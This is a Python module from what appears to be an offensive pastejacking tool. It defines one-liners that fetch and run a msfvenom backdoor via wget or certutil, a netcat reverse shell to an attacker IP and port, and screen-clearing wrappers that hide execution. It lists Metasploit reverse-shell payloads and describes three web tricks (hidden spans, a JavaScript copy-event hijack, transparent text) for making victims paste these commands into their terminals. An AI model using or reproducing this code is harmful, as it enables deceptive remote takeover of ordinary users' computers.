from . import settings, utils
from .color import *
import copy

linux = { "Download and execute a msfvenom backdoor using wget (Web delivery + PasteJacking)":"wget http://{ip}:{port}/main.elf &> /dev/null && chmod +x ./main.elf && ./main.elf & disown",
          "Get me a simple reverse connection using netcat (Reverse connection + PasteJacking)":"nc -e /bin/sh {ip} {port} & disown",
          "Only serve my custom one-liner and do your PasteJacking thing! (PasteJacking only!)":None
}
windows = { "Download and execute a msfvenom backdoor using certutil (Web delivery + PasteJacking)":"certutil.exe -urlcache -split -f http://{ip}:{port}/main.exe main.exe 2>&1 && main.exe",
            "Only serve my custom one-liner and do your PasteJacking thing! (PasteJacking only!)":None
}

final_touches = {
    "Windows":"cls & {liner} & cls &",
    "Linux":"clear; {liner} && clear;"
}

escapes = {
    "Windows":[">NUL 2>&1 &","REM "],
    "Linux":["&>/dev/null;","#"]
}

metasploit_modules = {
    "Windows":[
        "windows/meterpreter/reverse_tcp",
        "windows/meterpreter/reverse_http",
        "windows/meterpreter/reverse_https",
        "windows/shell/reverse_tcp"],
    "Linux":[
        "linux/x86/meterpreter/reverse_tcp",
        "linux/x86/meterpreter_reverse_http",
        "linux/x86/meterpreter_reverse_https",
        "linux/x86/shell/reverse_tcp",
        "linux/x64/meterpreter/reverse_tcp",
        "linux/x64/meterpreter_reverse_http",
        "linux/x64/meterpreter_reverse_https",
        "linux/x64/shell/reverse_tcp"
    ]
    }

# Was printing the advantages and disadvantages in the tool before but now no
pastejacking = {
    "Using span style attribute to hide our lines.":{
        "file":'style_method.html',
        "advantages":"Doesn't require javascript to be enabled. Works on all browsers.",
        "disadvantages":"Target must select all the text in the page or the first two words to ensure that he copies our hidden malicious lines."
    },
    "Using javascript to hook the copy event and replace copied data.":{
        "file":'js_method.html',
        "advantages":"Anything the user copies in the page will be replaced with our line. Command executed by itself once target paste it without pressing enter.",
        "disadvantages":"Requires javascript to be enabled on the target browser."
    },
    "Using span style again but this time to make our text transparent and non-markable":{
        "file":'color_method.html',
        "advantages":"Doesn't require javascript to be enabled.",
        "disadvantages":"Target must select all the text in the page to ensure that he copies our hidden malicious lines. Not working on opera and chrome."
    }
}
def save_os_type(choice):
    settings.os = {
        1:"Windows",
        2:"Linux"
    }[choice]

def get_liners(keys_only=True):
    if keys_only:
        return list(linux.keys()) if settings.os == "Linux" else list(windows.keys())
    else:
        return linux if settings.os == "Linux" else windows

def set_liner(liner_choice):
    liners = get_liners(False)
    liners_keys = list( liners.keys() )
    liner = liners_keys[int(liner_choice)-1]
    if "custom" in liner:
        while True:
            settings.liner=settings.final_liner=colored_input("Enter your one-liner",spaces=7)
            if settings.liner:
                break
        touches = final_touches[settings.os]
        settings.final_liner = touches.format(liner=settings.final_liner)
        return 0

    elif "netcat" in liner:
        ip,port = utils.ask_for_ip_port()
        settings.liner = liners[liner].format(ip=ip,port=port)
        prepare_liner(ip,port)
        return 1

    else:
        settings.liner = liners[liner]
        return 2

def get_payloads():
    return metasploit_modules[settings.os]

def prepare_liner(ip,port):
    settings.final_liner = settings.liner.format(ip=ip,port=port)
    touches = final_touches[settings.os]
    settings.final_liner = touches.format(liner=settings.final_liner)

def get_templates():
    temp = copy.deepcopy(pastejacking)
    for template in temp:
        blah = temp[template].pop("file")
    return temp

def set_template(templates_choice):
    templates_keys = list( pastejacking.keys() )
    template = templates_keys[int(templates_choice)-1]
    settings.template = pastejacking[template]["file"]

def get_escapes():
    return escapes[settings.os]
